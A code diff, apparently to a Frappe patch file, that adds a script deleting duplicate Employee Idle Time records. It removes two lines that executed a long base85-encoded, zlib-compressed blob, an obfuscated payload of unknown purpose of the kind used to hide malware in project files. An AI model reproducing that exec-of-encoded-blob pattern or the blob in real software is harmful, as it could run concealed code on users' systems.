@@ -1,3 +1,26 @@
+# If same employee idle time are created multiple times then delete all duplicates
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%03YS##P*6oudU6}VU|;V}h?G0d<N76lxGSqvc+jFy(vT3W5G)h(O+_5e=hA*FK7RAp+WU%T(Ed%tr|LmN9@kOpdKd!7NYBLUN9fGLWeqNd?t+fuM0MH&hSgua|^CcZ5yQqgxUj#28_rUg}?(O5w~p>fEi(#K=@5rQ%FV60Kc0fBAlZjq=4b1fA~p)4w{V}Xc9oDHCDVhsdPVJeF~)5WxS?&0YX7DbDQ%%Hw*xT*~G*Y1~c_Tbi8cC(SIe0Rt)%V(wEY=e9wKUlpqS{*b#2-`yEWgt6Giwd3Bpe#h&{964~yB>Lq0jU<M3!+(tU3=F#Ofp?n=xlX<wp+PWT?VUV1&!Q?>2=`a-Anc6qSxKeGM#3;?+4rzJy&vKp+)#d*So)3FNLLw*5&bd+i2SjcT|@ah4#zUd$1=x+MJcO%k#`U&;OAY{U-&=L38PafKM6BQrVG|srY70tkCvNdL;e@c`^u@h;1guim6J_*3p;$fb|jcw`Z6O7q>8*mvWz{{Aww6Cy(We%i}g*)2id0i<9O}LzGT()Yp`!$|Q7sK&awHVIcVtQ~t+3YafQW`$oO;uxSNwyZ@HSY)~%z(CF3fuP6O>r^nIeZsX*I&a_v^SE?SK^jKS)ObdGNx>XYOz9t-Qh6n7gW_#_U+3yIXwO;7`i_vX%c4fj1R#*L79B7RY3CAs#()t6)FgVt>&dr=<>Nmz`yCQ6cZD(YUU2DS{`@6v>ym$<e!iUp2G2v_|PNIjq4aE!l0_ExssKpidUg+A~OyG7u9aua{W{UxbL>u_cM68KK&-H&F>sv%~rAbsOmC917_VHw+qTxWqCENSoo+Z1d+48Ov&P${DtECHR>;$IigOD;mG=LfSN<g@zq@DtO?vr%+Yt)b2)7T)`iX4L6V?q>aF<@G!m?Q<_uXE?*OaKc6;7M`hH*)d2vhmj6@Z2a5SibTwg{tXI32S!WT~%kfGIsNWcYjtce*!w4q~-sq=)X(&AL5_?w)?xs@*Ln-`T6s;PHe_dpc#|`S<y)x0L&%LUp&Q#Pkje7ZJ}Z')).decode())
+
+duplicate_employee_idle_logs = frappe.db.sql("""
+select min(name) as name_to_keep, employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME), count(*) as count
+from `tabEmployee Idle Time`
+group by employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)
+having count(*) > 1
+""", as_dict=True)
+
+names_to_keep = [row['name_to_keep'] for row in duplicate_employee_idle_logs]
+names_to_delete = frappe.db.sql("""
+select name
+from `tabEmployee Idle Time`
+where (employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)) in (
+    select employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)
+    from `tabEmployee Idle Time`
+    group by employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)
+    having count(*) > 1
+) and name not in ({names})
+""".format(names=", ".join(["%s"] * len(names_to_keep))), names_to_keep, as_dict=True)
+
+for doc in names_to_delete:
+    frappe.delete_doc('Employee Idle Time', doc['name'])
+    print(doc.name)
